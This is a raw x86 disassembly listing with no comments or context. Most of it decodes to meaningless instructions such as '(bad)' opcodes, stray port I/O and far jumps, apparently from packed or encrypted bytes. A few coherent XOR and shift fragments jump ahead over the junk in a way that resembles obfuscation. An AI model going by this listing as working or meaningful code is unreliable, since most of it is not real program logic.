  408c44:	mov    bh,0xd2
  408c46:	into   
  408c47:	ss iret 
  408c49:	add    BYTE PTR [esi],dh
  408c4b:	push   cs
  408c4c:	xor    BYTE PTR [edi],cl
  408c4e:	inc    ebx
  408c4f:	cdq    
  408c50:	fwait
  408c51:	dec    esp
  408c52:	pop    eax
  408c53:	jno    0x408c17
  408c55:	rcl    DWORD PTR [ebp+0x64],1
  408c58:	mov    ebx,0x4466ac93
  408c5d:	sub    esi,DWORD PTR [ebx+0x5]
  408c60:	xor    DWORD PTR [ebp+ebx*1+0x60c03427],0xffffffee
  408c68:	or     eax,0x204189b9
  408c6d:	adc    dl,BYTE PTR [ecx-0xb]
  408c70:	add    eax,0x787ed109
  408c75:	pop    eax
  408c76:	sub    al,0x59
  408c78:	sar    DWORD PTR [esi],0xde
  408c7b:	shr    BYTE PTR [eax-0x5e54b9d3],0x96
  408c82:	int3   
  408c83:	clc    
  408c84:	addr16 out 0xc6,al
  408c87:	sub    BYTE PTR [eax],bh
  408c89:	out    dx,al
  408c8a:	mov    WORD PTR [edi-0x27741e21],ss
  408c90:	push   0x2aa686ca
  408c95:	or     al,0xc0
  408c97:	test   BYTE PTR [ebx+eiz*1],cl
  408c9a:	frstor [esi-0x183f8eff]
  408ca0:	push   ds
  408ca1:	cmp    BYTE PTR [edx-0x12],cl
  408ca4:	pop    eax
  408ca5:	lock out 0x5d,eax
  408ca8:	dec    eax
  408ca9:	xchg   ebx,eax
  408caa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408cab:	pop    eax
  408cac:	cmp    dh,BYTE PTR [ebx]
  408cae:	jno    0x408c7b
  408cb0:	cwde   
  408cb1:	inc    eax
  408cb2:	cmp    eax,0x53cb1305
  408cb7:	jecxz  0x408cd5
  408cb9:	xor    cl,BYTE PTR [edi]
  408cbb:	sahf   
  408cbc:	and    eax,0x97fb9e8a
  408cc1:	xlat   BYTE PTR ds:[bx]
  408cc3:	add    ch,bl
  408cc5:	rcr    BYTE PTR [eax-0x38b69b4d],cl
  408ccb:	mov    esp,0xd658aa6
  408cd0:	inc    edi
  408cd1:	sub    al,0x4b
  408cd3:	in     al,dx
  408cd4:	(bad)  
  408cd5:	and    al,0x46
  408cd7:	clc    
  408cd8:	push   ecx
  408cd9:	fisub  DWORD PTR [ebp+0x3]
  408cdc:	(bad)  
  408cde:	lods   al,BYTE PTR ds:[esi]
  408cdf:	in     eax,dx
  408ce0:	mov    esi,0xab0f413f
  408ce5:	sub    al,0x3
  408ce7:	dec    esi
  408ce8:	jmp    0xee17:0x8b0f104c
  408cef:	ins    DWORD PTR es:[edi],dx
  408cf0:	inc    edi
  408cf1:	mov    eax,ds:0x1745a7e5
  408cf6:	inc    edx
  408cf7:	sub    ah,bh
  408cf9:	sahf   
  408cfa:	add    DWORD PTR [ebx-0x3125b5b8],esp
  408d00:	ja     0x408c94
  408d02:	adc    edx,DWORD PTR [esi]
  408d04:	cld    
  408d05:	cmp    ax,0x72ac
  408d09:	dec    eax
  408d0a:	iret   
  408d0b:	(bad)
  408d0e:	mov    al,ds:0x31f15484
  408d13:	mov    ch,0x8f
  408d15:	jo     0x408d4a
  408d17:	sbb    cl,BYTE PTR [edx]
  408d19:	jle    0x408cfb
  408d1b:	xchg   edx,eax
  408d1c:	push   0xffffff87
  408d1e:	or     al,0x18
  408d20:	adc    DWORD PTR [eax+0x42],eax
  408d23:	mov    dl,ah
  408d25:	or     ch,BYTE PTR [edi]
  408d27:	jb     0x408d43
  408d29:	cs dec edx
  408d2b:	inc    eax
  408d2c:	or     eax,0xcbc5dbaf
  408d31:	dec    ecx
  408d32:	cmp    esi,DWORD PTR ds:0x9a31326e
  408d38:	jae    0x408ce3
  408d3a:	ss dec ecx
  408d3c:	leave  
  408d3d:	adc    al,0xfe
  408d3f:	jecxz  0x408d4f
  408d41:	stos   BYTE PTR es:[edi],al
  408d42:	pop    esp
  408d43:	cmp    DWORD PTR [esp+esi*4],eax
  408d46:	pop    es
  408d47:	xchg   edx,eax
  408d48:	pop    edx
  408d49:	pop    esp
  408d4a:	push   ecx
  408d4b:	sub    ah,bl
  408d4d:	inc    eax
  408d4e:	dec    ebp
  408d4f:	add    al,0x32
  408d51:	and    DWORD PTR [ecx+0x2c],esp
  408d54:	ja     0x408d8c
  408d56:	dec    esp
  408d57:	in     al,0x4f
  408d59:	ret    0xb4b0
  408d5c:	icebp  
  408d5d:	dec    esp
  408d5e:	adc    DWORD PTR [ebx+0x6f],edi
  408d61:	aaa    
  408d62:	test   eax,0x7781cd8b
  408d67:	mov    ch,0xb0
  408d69:	ffreep st(5)
  408d6b:	sbb    BYTE PTR [ebp-0x29],bh
  408d6e:	mov    bl,0xad
  408d70:	xchg   ebx,eax
  408d71:	push   edx
  408d72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d73:	inc    eax
  408d74:	call   edi
  408d76:	int3   
  408d77:	fadd   DWORD PTR [eax]
  408d79:	mov    ebx,DWORD PTR [ecx-0x55a0166e]
  408d7f:	add    eax,DWORD PTR [ecx+0x14]
  408d82:	inc    edx
  408d83:	mov    BYTE PTR [eax-0x77],0x93
  408d87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408d88:	out    dx,eax
  408d89:	cmp    bh,0x8a
  408d8c:	call   0xa230:0x7838baa9
  408d93:	sbb    al,0xdf
  408d95:	or     dh,BYTE PTR [ecx+0x50]
  408d98:	out    dx,eax
  408d99:	dec    esp
  408d9a:	adc    al,0xc
  408d9c:	cli    
  408d9d:	cmp    al,0xc6
  408d9f:	aad    0xba
  408da1:	das    
  408da2:	xchg   edi,eax
  408da3:	nop
  408da4:	mov    ds:0xbce1e485,eax
  408da9:	inc    ecx
  408daa:	push   edx
  408dab:	js     0x408db4
  408dad:	cmp    ebx,DWORD PTR [ebx+ebp*4-0x7f550907]
  408db4:	adc    eax,0x28f2b4b
  408db9:	add    al,0x2
  408dbb:	jle    0x408dd0
  408dbd:	inc    edi
  408dbe:	fs adc al,0x78
  408dc1:	cmp    BYTE PTR [ecx+0x2653394f],dh
  408dc7:	dec    esi
  408dc8:	xchg   ebp,eax
  408dc9:	stos   DWORD PTR es:[edi],eax
  408dca:	add    DWORD PTR [edx-0x63a2b707],esi
  408dd0:	mov    bl,0xf6
  408dd2:	cmp    DWORD PTR [edx+0x58718e0b],ebx
  408dd8:	push   es
  408dd9:	adc    DWORD PTR [esi+0x71],ebx
  408ddc:	sbb    BYTE PTR [esi-0x35951944],dh
  408de2:	dec    edx
  408de3:	xlat   BYTE PTR ds:[ebx]
  408de4:	push   es
  408de5:	pusha  
  408de6:	mov    dl,0xd8
  408de8:	jmp    ebp
  408dea:	nop
  408deb:	push   edi
  408dec:	mov    DWORD PTR [ecx],0x2c0fc414
  408df2:	cmp    al,0xf2
  408df4:	add    BYTE PTR [edi-0x49ba6b2b],0x33
  408dfb:	dec    eax
  408dfc:	or     DWORD PTR [ebp+0x7c332709],eax
  408e02:	adc    al,0x76
  408e04:	xchg   edx,eax
  408e05:	data16 mov dh,0xb3
  408e08:	mov    BYTE PTR [ecx-0x3b],dl
  408e0b:	div    BYTE PTR ds:0xf3e1528d
  408e11:	ficom  WORD PTR [ecx]
  408e13:	int    0xaa
  408e15:	mov    WORD PTR [edx],fs
  408e17:	lea    eax,[esi+eax*1+0x20b4a4d0]
  408e1e:	dec    esp
  408e1f:	lahf   
  408e20:	dec    ecx
  408e21:	test   eax,0xbfd679f8
  408e26:	xlat   BYTE PTR ds:[ebx]
  408e27:	icebp  
  408e28:	mov    al,0xf9
  408e2a:	jns    0x408e20
  408e2c:	jb     0x408e77
  408e2e:	and    al,bh
  408e30:	adc    esi,ecx
  408e32:	push   ss
  408e33:	lds    esp,FWORD PTR [eax+0x79]
  408e36:	cmp    BYTE PTR [edi],0xfb
  408e39:	add    BYTE PTR [ebp+esi*1-0x5e],cl
  408e3d:	in     al,dx
  408e3e:	inc    esp
  408e3f:	jo     0x408e80
  408e41:	shrd   eax,edx,0x2
  408e45:	mov    DWORD PTR [ebp+0x14],eax
  408e48:	mov    eax,DWORD PTR [esi]
  408e4a:	xor    DWORD PTR [ebp+0x14],edi
  408e4d:	shr    edx,0x2
  408e50:	mov    edx,DWORD PTR [esi+0x4]
  408e53:	xor    edx,edx
  408e55:	shl    eax,0x1e
  408e58:	or     edx,DWORD PTR [ebp+0x14]
  408e5b:	mov    DWORD PTR [ebp-0x28],edx
  408e5e:	mov    eax,DWORD PTR [ebp-0x24]
  408e61:	mov    eax,DWORD PTR [ebp-0x24]
  408e64:	jmp    0x409242
  408e69:	and    al,BYTE PTR [ebp-0x6d]
  408e6c:	pop    ss
  408e6d:	jb     0x408e35
  408e6f:	and    ah,BYTE PTR ds:0x7e10ec41
  408e75:	pop    ecx
  408e76:	cmp    cl,bl
  408e78:	jo     0x408eb4
  408e7a:	push   ecx
  408e7b:	sbb    BYTE PTR [eax],bl
  408e7d:	sahf   
  408e7e:	adc    bl,BYTE PTR [eax]
  408e80:	sbb    BYTE PTR [edi-0xdcf192d],bh
  408e86:	ins    DWORD PTR es:[edi],dx
  408e87:	nop
  408e88:	xchg   esp,eax
  408e89:	jb     0x408e2d
  408e8b:	int    0x79
  408e8d:	push   0x4cc61809
  408e92:	(bad)  
  408e93:	adc    dl,ch
  408e95:	xor    al,0xb
  408e97:	and    al,0x6a
  408e99:	sbb    dh,BYTE PTR [edi]
  408e9b:	push   es
  408e9c:	stos   BYTE PTR es:[edi],al
  408e9d:	fwait
  408e9e:	push   edi
  408e9f:	sbb    edi,DWORD PTR [eax-0x63]
  408ea2:	mul    DWORD PTR [eax+ecx*4-0x76]
  408ea6:	aaa    
  408ea7:	add    BYTE PTR [edx+0x3646ac81],0xfd
  408eae:	xor    eax,0x64ee9155
  408eb3:	cmp    eax,0xee27a6f5
  408eb8:	in     eax,dx
  408eb9:	pop    edx
  408eba:	jge    0x408ed8
  408ebc:	cmp    dl,bl
  408ebe:	jns    0x408ef8
  408ec0:	aad    0xc5
  408ec2:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  408ec4:	mov    edx,0xc29329f3
  408ec9:	sub    DWORD PTR [ebp+0x20],ecx
  408ecc:	or     esp,edx
  408ece:	mov    ds:0xd7494557,eax
  408ed3:	sub    ebp,ecx
  408ed5:	mov    ah,0xf2
  408ed7:	stc    
  408ed8:	add    eax,0x4deaa410
  408edd:	sbb    esp,esp
  408edf:	mov    edi,0x723d229b
  408ee4:	dec    edx
  408ee5:	and    DWORD PTR [eax+0x19],esi
  408ee8:	outs   dx,BYTE PTR ds:[esi]
  408ee9:	aaa    
  408eea:	add    al,0x2e
  408eec:	idiv   DWORD PTR [ebx-0x646dc355]
  408ef2:	pop    ss
  408ef3:	(bad)  
  408ef4:	cld    
  408ef5:	pop    eax
  408ef6:	iret   
  408ef7:	int    0xfb
  408ef9:	pop    ebx
  408efa:	jnp    0x408e7c
  408efc:	inc    ebx
  408efd:	and    eax,0xe74affaa
  408f02:	test   DWORD PTR [ecx],ebx
  408f04:	inc    ebp
  408f05:	mov    cl,0xef
  408f07:	mov    ?,WORD PTR [esi+0x65]
  408f0a:	retf   
  408f0b:	cmp    eax,0x3e2a3744
  408f10:	cmp    al,0xe2
  408f12:	fcomp  st(3)
  408f14:	push   es
  408f15:	aad    0x4
  408f17:	bound  eax,QWORD PTR [edi-0x427043f5]
  408f1d:	jmp    0xcc5f9e6e
  408f22:	push   0xffffff80
  408f24:	jo     0x408fa4
  408f26:	and    eax,0x81a099b7
  408f2b:	in     al,dx
  408f2c:	not    DWORD PTR [eax]
  408f2e:	mov    esp,0x37ff037b
  408f33:	fucomi st,st(2)
  408f35:	jmp    0x3e48:0x8f2af123
  408f3c:	fnsave es:[ebp+0x40e5bd4]
  408f43:	push   0xffffffa1
  408f45:	xor    al,0x57
  408f47:	shr    ch,1
  408f49:	push   0x63f1f2b2
  408f4e:	cwde   
  408f4f:	das    
  408f50:	push   0x1b
  408f52:	xor    al,0xd8
  408f54:	and    BYTE PTR [edx+0x4c74f28],al
  408f5a:	xor    DWORD PTR [eax],ebx
  408f5c:	(bad)  
  408f5d:	and    ebp,DWORD PTR [eax+0x6c40479e]
  408f63:	add    DWORD PTR [edx+eiz*4-0x30],ebx
  408f67:	cmp    ah,cl
  408f69:	sub    al,0x94
  408f6b:	(bad)  
  408f6c:	push   es
  408f6d:	icebp  
  408f6e:	aas    
  408f6f:	test   eax,0xe862395b
  408f74:	xchg   ebp,eax
  408f75:	lods   eax,DWORD PTR ds:[esi]
  408f76:	sbb    bl,BYTE PTR [edi]
  408f78:	pushf  
  408f79:	dec    ecx
  408f7a:	out    dx,al
  408f7b:	and    BYTE PTR [edi-0x45],ch
  408f7e:	add    al,0x0
  408f80:	push   ebp
  408f81:	in     eax,dx
  408f82:	xchg   esi,eax
  408f83:	mov    dh,0x95
  408f85:	mov    cl,0xfd
  408f87:	sub    al,BYTE PTR [edi+0x7f7e137f]
  408f8d:	les    esi,FWORD PTR [edx+0x226a8f2]
  408f93:	jmp    0x408f61
  408f95:	pop    eax
  408f96:	sub    DWORD PTR [edx-0x125ad564],eax
  408f9c:	rol    ecx,cl
  408f9e:	mov    cl,0x4e
  408fa0:	inc    ecx
  408fa1:	or     edx,ecx
  408fa3:	cmp    eax,0x5ec3aeaa
  408fa8:	bnd jg 0x409029
  408fab:	dec    edi
  408fac:	bound  esp,QWORD PTR [eax+edx*1-0x24]
  408fb0:	bound  edi,QWORD PTR ds:0x81309e63
  408fb6:	mov    eax,0x73b4dfd7
  408fbb:	jecxz  0x408ffa
  408fbd:	je     0x408fd1
  408fbf:	inc    edx
  408fc0:	sub    dl,dl
  408fc2:	xchg   esp,eax
  408fc3:	sub    DWORD PTR [ebx-0x37],eax
  408fc6:	or     eax,0xfa39e638
  408fcb:	cmp    BYTE PTR [esi],ah
  408fcd:	xor    dh,dh
  408fcf:	cdq    
  408fd0:	sub    BYTE PTR [esi-0x5d996d27],cl
  408fd6:	mov    esp,DWORD PTR [esp+eax*8-0x50a0c268]
  408fdd:	int    0x19
  408fdf:	xchg   edi,eax
  408fe0:	mov    ch,0xc8
  408fe2:	add    cl,BYTE PTR [ecx]
  408fe4:	out    dx,eax
  408fe5:	ret    
  408fe6:	clc    
  408fe7:	push   ss
  408fe8:	cmp    edx,DWORD PTR [esi]
  408fea:	std    
  408feb:	rol    BYTE PTR [edi],1
  408fed:	cmc    
  408fee:	dec    ebx
  408fef:	fisubr DWORD PTR [eax+edx*4]
  408ff2:	lods   al,BYTE PTR ds:[esi]
  408ff3:	or     al,0x44
  408ff5:	pushf  
  408ff6:	es jge 0x408fcb
  408ff9:	out    0x29,eax
  408ffb:	add    eax,DWORD PTR [edi-0x4e87f6f6]
  409001:	mov    eax,ds:0x1c9fbd4f
  409006:	aas    
  409007:	test   dl,0x25
  40900a:	imul   esi,ebx,0x25c48e4e
  409010:	mov    ch,0xb9
  409012:	stos   DWORD PTR es:[edi],eax
  409013:	ja     0x408fdc
  409015:	je     0x409070
  409017:	push   edx
  409018:	sbb    ah,BYTE PTR [edi]
  40901a:	dec    edx
  40901b:	fnsave [esp+eax*1]
  40901e:	fisubr WORD PTR ds:0x7f5f0e17
  409024:	mov    al,0xa4
  409026:	adc    ebx,DWORD PTR [esi+ecx*1+0x447fd2f5]
  40902d:	scas   eax,DWORD PTR es:[edi]
  40902e:	retf   0xcd89
  409031:	iret   
  409032:	pop    DWORD PTR [ebx-0x54]
  409035:	loope  0x409022
  409037:	rol    BYTE PTR [edi+0x3],1
  40903a:	push   ds
  40903b:	loopne 0x409033
  40903d:	pushf  
  40903e:	test   eax,0xb730fb4b
  409043:	add    BYTE PTR [edi-0x47],al
  409046:	in     al,dx
  409047:	xchg   ebp,eax
  409048:	data16 xlat BYTE PTR ds:[ebx]
  40904a:	mov    BYTE PTR [ecx+0x4c],ah
  40904d:	sub    eax,0xb4914958
  409052:	jnp    0x4090bc
  409054:	repz mov ds:0x891097c0,eax
  40905a:	gs push 0xd47b5dfc
  409060:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409061:	jb     0x409092
  409063:	fcmovb st,st(1)
  409065:	lahf   
  409066:	nop
  409067:	retf   0x4cda
  40906a:	dec    ebp
  40906b:	add    eax,0x4449fb0b
  409070:	aam    0x44
  409072:	inc    esp
  409073:	out    0x89,eax
  409075:	call   0x156acefe
  40907a:	cdq    
  40907b:	jecxz  0x4090aa
  40907d:	cmp    bh,BYTE PTR [esi-0x69]
  409080:	add    BYTE PTR [ecx],bh
  409082:	sbb    al,0x75
  409084:	cmp    bl,BYTE PTR [ecx-0x59c2d5f0]
  40908a:	loop   0x409057
  40908c:	outs   dx,DWORD PTR ds:[esi]
  40908d:	mov    esi,0x9ae48893
  409092:	std    
  409093:	rol    DWORD PTR [esi+0x78],0x26
  409097:	mov    WORD PTR [edi+0x3f],gs
  40909a:	jle    0x409059
  40909c:	shl    DWORD PTR [eax+0x282f5e3e],0xab
  4090a3:	(bad)  
  4090a4:	cmp    dl,dl
  4090a6:	jl     0x409117
  4090a8:	adc    DWORD PTR [ecx+0x6f],esi
  4090ab:	xor    al,0xe3
  4090ad:	fld    DWORD PTR [ebp-0x37ae5cc8]
  4090b3:	dec    edx
  4090b4:	mov    ds:0x77c2d618,eax
  4090b9:	lea    edx,[edi+eiz*8]
  4090bc:	stc    
  4090bd:	pop    esi
  4090be:	or     eax,0xf408ad21
  4090c3:	sar    BYTE PTR [ebx-0x70bfa800],0xff
  4090ca:	xor    BYTE PTR [ebx-0x64e370b6],0x95
  4090d1:	push   eax
  4090d2:	lock out dx,al
  4090d4:	mov    fs,eax
  4090d6:	push   ss
  4090d7:	outs   dx,BYTE PTR ds:[esi]
  4090d8:	in     al,0x5d
  4090da:	rcl    esi,1
  4090dc:	push   ebx
  4090dd:	or     DWORD PTR [esi+edx*2-0x5dcf48fd],ebp
  4090e4:	or     BYTE PTR [eax+0x3dfa72b2],bl
  4090ea:	xchg   BYTE PTR [ecx+0x9],cl
  4090ed:	pop    ds
  4090ee:	lods   al,BYTE PTR ds:[esi]
  4090ef:	scas   eax,DWORD PTR es:[edi]
  4090f0:	lock xsha256 (bad)
  4090f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4090f3:	push   ecx
  4090f4:	mov    esp,0x9fa170b7
  4090f9:	js     0x409176
  4090fb:	push   0x806407ee
  409100:	mov    al,0x64
  409102:	mov    es,eax
  409104:	scas   eax,DWORD PTR es:[edi]
  409105:	sub    esi,DWORD PTR [ebp+0x43]
  409108:	hlt    
  409109:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40910a:	mov    dh,0x72
  40910c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40910d:	stc    
  40910e:	dec    esi
  40910f:	mov    DWORD PTR ds:0x1eed0938,edi
  409115:	mov    ds:0xbda38d7d,eax
  40911a:	retf   0xdc39
  40911d:	pop    es
  40911e:	or     ecx,ebx
  409120:	push   edx
  409121:	dec    ecx
  409122:	jl     0x409158
  409124:	js     0xdf1fa719
  40912a:	jae    0x4090c6
  40912c:	inc    esi
  40912d:	jmp    0x673d866c
  409132:	rcr    esp,cl
  409134:	sub    DWORD PTR [edi],esp
  409136:	(bad)  
  409137:	mov    ds:0xef3a6b1c,eax
  40913c:	pop    edx
  40913d:	scas   al,BYTE PTR es:[edi]
  40913e:	je     0x40915a
  409140:	xchg   ebp,eax
  409141:	daa    
  409142:	add    eax,0x3a05993e
  409147:	mov    cl,0x33
  409149:	test   DWORD PTR [esi+0x22],edi
  40914c:	fsub   st(7),st
  40914e:	push   ebp
  40914f:	imul   ecx,DWORD PTR [ecx+eiz*4-0x30392f5a],0xffffff86
  409157:	inc    esp
  409158:	nop
  409159:	ret    
  40915a:	xor    DWORD PTR [ecx+0xa1d690],0xfffffff9
  409161:	aas    
  409162:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409163:	dec    ebp
  409164:	push   esp
  409165:	sub    eax,0x425a362d
  40916a:	mov    ecx,0x2b347e5b
  40916f:	cdq    
  409170:	or     edi,DWORD PTR [eax]
  409172:	std    
  409173:	pusha  
  409174:	scas   eax,DWORD PTR es:[edi]
  409175:	jmp    0xb76938d7
  40917a:	fsubr  QWORD PTR [edi-0x31]
  40917d:	push   esp
  40917e:	xor    eax,0x88b89f19
  409183:	out    dx,eax
  409184:	or     BYTE PTR [ebp-0x57488d0d],bh
  40918a:	adc    eax,0x248ef2e4
  40918f:	pop    ds
  409190:	xlat   BYTE PTR ds:[ebx]
  409191:	es pushw ds
  409194:	jmp    0xbafd:0xcc04d977
  40919b:	or     edx,ecx
  40919d:	sub    al,0xbd
  40919f:	mov    eax,0x46939f7d
  4091a4:	or     BYTE PTR [ecx+edx*8+0x47485743],ah
  4091ab:	push   0xb6be2bfc
  4091b0:	sbb    edx,DWORD PTR [ebp+ebx*4-0x6e]
  4091b4:	pop    ds
  4091b5:	sub    DWORD PTR [edx-0x22],esi
  4091b8:	dec    ebx
  4091b9:	sahf   
  4091ba:	adc    DWORD PTR [ebp-0x4f],eax
  4091bd:	mov    al,0x4c
  4091bf:	xor    ch,bl
  4091c1:	or     DWORD PTR [ebx-0x45c654ba],0x2
  4091c8:	xor    ch,BYTE PTR [ecx-0x5e3b3d89]
  4091ce:	jmp    0x40916d
  4091d0:	fstp   QWORD PTR [edi-0x6e]
  4091d3:	fcomip st,st(6)
  4091d5:	dec    esi
  4091d6:	je     0x4091a9
  4091d8:	out    dx,al
  4091d9:	mov    ds:0x30dbb63f,al
  4091de:	cdq    
  4091df:	xchg   esi,eax
  4091e0:	in     eax,dx
  4091e1:	xchg   ebx,eax
  4091e2:	js     0x4091a7
  4091e4:	mov    al,0xda
  4091e6:	or     eax,0xe41438c5
  4091eb:	pop    ds
  4091ec:	(bad)  
  4091ed:	out    0x29,eax
  4091ef:	sbb    dl,BYTE PTR [ebx-0x69]
  4091f2:	pop    ebp
  4091f3:	dec    ebp
  4091f4:	cmp    al,0x79
  4091f6:	mov    edx,DWORD PTR [ebp+0x11]
  4091f9:	jge    0x4091d5
  4091fb:	(bad)  
  4091fd:	jecxz  0x4091a4
  4091ff:	fs and eax,0xc1260832
  409205:	adc    al,0x6d
  409207:	idiv   ebx
  409209:	ret    0x17ea
  40920c:	jmp    DWORD PTR [eax-0x44]
  40920f:	les    eax,FWORD PTR [esi-0x83be230]
  409215:	imul   ebx,DWORD PTR [esi+0x70d23f43],0xffffffb0
  40921c:	lods   al,BYTE PTR ds:[esi]
  40921d:	ins    DWORD PTR es:[edi],dx
  40921e:	jmp    0x40929f
  409220:	test   al,0xe2
  409222:	add    al,0xbf
  409224:	pop    esi
  409225:	into   
  409226:	ss test al,0xdb
  409229:	out    0x74,al
  40922b:	jl     0x40925f
  40922d:	xchg   esp,eax
  40922e:	cs add al,0x78
  409231:	out    dx,eax
  409232:	jmp    0xe32101f8
  409237:	jle    0x409256
  409239:	xchg   esp,eax
  40923a:	or     bl,BYTE PTR [edi]
  40923c:	mov    al,ds:0x41b2ff57
  409241:	popa   
  409242:	xor    edx,edx
  409244:	shld   edx,eax,0x2
  409248:	xor    edx,ecx
  40924a:	mov    DWORD PTR [ebp+0xc],edx
  40924d:	jmp    0x40962b
  409252:	loop   0x409279
  409254:	es jmp 0x617f:0x1d1aea26
  40925c:	mov    eax,ds:0xdde45e70
  409261:	jle    0x409223
  409263:	dec    ecx
  409264:	sbb    BYTE PTR [eax],bl
  409266:	sahf   
  409267:	adc    bl,BYTE PTR [eax]
  409269:	sbb    BYTE PTR [esi+0x2e],ah
  40926c:	and    ecx,edi
  40926e:	retf   0xc944
  409271:	hlt    
  409272:	mov    DWORD PTR [ecx],ebx
  409274:	cmp    DWORD PTR [ebp-0x30a654ec],edi
  40927a:	lea    edi,[edi]
  40927c:	rep outs dx,BYTE PTR ds:[esi]
  40927e:	inc    ebp
  40927f:	je     0x4092d2
  409281:	mov    ecx,0xf42088dc
  409286:	jg     0x409263
  409288:	es data16 in al,0x9b
  40928c:	mov    edx,0x2daa1e3f
  409291:	stos   BYTE PTR es:[edi],al
  409292:	test   BYTE PTR [edx-0x79e02dd9],0x58
  409299:	test   eax,0x6c8a8ae
  40929e:	inc    ebx
  40929f:	loopne 0x409245
  4092a1:	test   DWORD PTR ds:0x202faab8,0x1ecc7e36
  4092ab:	xor    BYTE PTR [edx-0x1e],0x3d
  4092af:	icebp  
  4092b0:	rol    BYTE PTR [eax],0x19
  4092b3:	rcl    BYTE PTR [ebx+0x3],0xc1
  4092b7:	dec    ebp
  4092b8:	(bad)  
  4092b9:	or     DWORD PTR [esi-0x13],edx
  4092bc:	xor    bh,bl
  4092be:	pushf  
  4092bf:	int    0xea
  4092c1:	(bad)  
  4092c2:	imul   eax,DWORD PTR [ecx+ecx*2+0x3a418897],0xb063ed23
  4092cd:	dec    edx
  4092ce:	repnz push ecx
  4092d0:	popa   
  4092d1:	jne    0x409305
  4092d3:	aad    0x68
  4092d5:	sub    ch,ch
  4092d7:	retf   0x7fdd
  4092da:	push   edi
  4092db:	pop    edx
  4092dc:	sbb    ebp,DWORD PTR [eax+0x28d70e55]
  4092e2:	adc    al,0xeb
  4092e4:	mov    al,0xc9
  4092e6:	addr16 clc 
  4092e8:	jo     0x4092d4
  4092ea:	pop    ss
  4092eb:	call   0xb26d:0x8662cde9
  4092f2:	pop    eax
  4092f3:	jno    0x409341
  4092f5:	cdq    
  4092f6:	sbb    bl,cl
  4092f8:	jb     0x409322
  4092fa:	shr    BYTE PTR [esi+0x764df313],1
  409300:	popa   
  409301:	add    esi,DWORD PTR [eax+0x50]
  409304:	cwde   
  409305:	stos   DWORD PTR es:[edi],eax
  409306:	jo     0x4092fb
  409308:	daa    
  409309:	add    eax,0xdbb2b5bd
  40930e:	pop    esp
  40930f:	dec    edx
  409310:	sbb    DWORD PTR [ecx],ebx
  409312:	mov    esp,0x7cf11afd
  409317:	ds inc eax
  409319:	pusha  
  40931a:	pop    eax
  40931b:	mov    edi,edi
  40931d:	xchg   edi,eax
  40931e:	stc    
  40931f:	mov    ch,0x54
  409321:	cld    
  409322:	pushf  
  409323:	push   es
  409324:	outs   dx,BYTE PTR ds:[esi]
  409325:	std    
  409326:	repz cs or eax,0xa5f4d1b
  40932d:	push   ebp
  40932e:	into   
  40932f:	mov    al,0x3
  409331:	test   eax,0x37d29c2a
  409336:	add    BYTE PTR [edx+0x3c24beb8],0x84
  40933d:	in     eax,0xfa
  40933f:	sti    
  409340:	or     edx,DWORD PTR fs:[eax+0x6137f5d]
  409347:	push   ecx
  409348:	mov    es,edx
  40934a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40934b:	aaa    
  40934c:	mov    ds:0xd38405b8,eax
  409351:	test   eax,0xaeadc5a6
  409356:	ror    BYTE PTR [ecx+0x47],0x80
  40935a:	fdivr  QWORD PTR [ecx+0x5987a477]
  409360:	jb     0x409337
  409362:	push   esp
  409363:	cmp    ebp,ebx
  409365:	and    DWORD PTR [ebx-0x46caf6da],0xffffffd6
  40936c:	jmp    DWORD PTR [esi+0x7f6a4c19]
  409372:	push   ebx
  409373:	ror    BYTE PTR [ecx+ebp*4-0x67b202a1],cl
  40937a:	adc    eax,0x38cff617
  40937f:	repz push ds
  409381:	retf   
  409382:	int3   
  409383:	aaa    
  409384:	inc    esi
  409385:	(bad)  
  409386:	and    bl,BYTE PTR [ebx-0x1c0e27a7]
  40938c:	outs   dx,BYTE PTR ds:[esi]
  40938d:	popa   
  40938e:	xchg   DWORD PTR [ebp+0x2e],ecx
  409391:	aam    0x23
  409393:	mov    al,ds:0x7b00bcf
  409398:	jne    0x409406
  40939a:	pop    eax
  40939b:	nop
  40939c:	pop    es
  40939d:	stc    
  40939e:	adc    BYTE PTR [ebx-0x1d4c5011],al
  4093a4:	imul   eax,DWORD PTR [edi*1-0x1b405e90],0x9a2c8e16
  4093af:	rcl    edi,cl
  4093b1:	sbb    edx,DWORD PTR [edx+0x55f6d0ca]
  4093b7:	jle    0x40936a
  4093b9:	xchg   BYTE PTR [ecx-0x17],bh
  4093bc:	cmp    bh,BYTE PTR [ebx]
  4093be:	in     eax,dx
  4093bf:	(bad)  
  4093c0:	jmp    0x48fee4d9
  4093c5:	inc    esi
  4093c6:	test   BYTE PTR [esi],dl
  4093c8:	sahf   
  4093c9:	jb     0x409416
  4093cb:	and    ecx,edi
  4093cd:	into   
  4093ce:	mov    BYTE PTR [edx],bh
  4093d0:	cmc    
  4093d1:	stos   DWORD PTR es:[edi],eax
  4093d2:	stos   BYTE PTR es:[edi],al
  4093d3:	dec    esp
  4093d4:	test   BYTE PTR [ebx],bh
  4093d6:	pop    ss
  4093d7:	xchg   DWORD PTR [esi-0x33],ebx
  4093da:	ja     0x4093a3
  4093dc:	mov    dl,0x68
  4093de:	push   edx
  4093df:	push   es
  4093e0:	sbb    DWORD PTR [esi-0xc897253],esp
  4093e6:	cli    
  4093e7:	out    dx,al
  4093e8:	xchg   ebp,eax
  4093e9:	adc    esi,ecx
  4093eb:	icebp  
  4093ec:	xor    ch,cl
  4093ee:	sub    dh,BYTE PTR [ebp+0x3ae0ddf7]
  4093f4:	adc    ebp,DWORD PTR [edi+0x51]
  4093f7:	fstp   QWORD PTR [ebx-0x5d]
  4093fa:	mov    ds:0xf2de5d4f,eax
  4093ff:	sbb    BYTE PTR [ebx-0x66],al
  409402:	inc    DWORD PTR [eax]
  409404:	sbb    al,BYTE PTR [ebx+0xf]
  409407:	push   edx
  409408:	sbb    esi,DWORD PTR [ecx-0x37]
  40940b:	loop   0x409461
  40940d:	adc    edx,DWORD PTR [eax+0x4e]
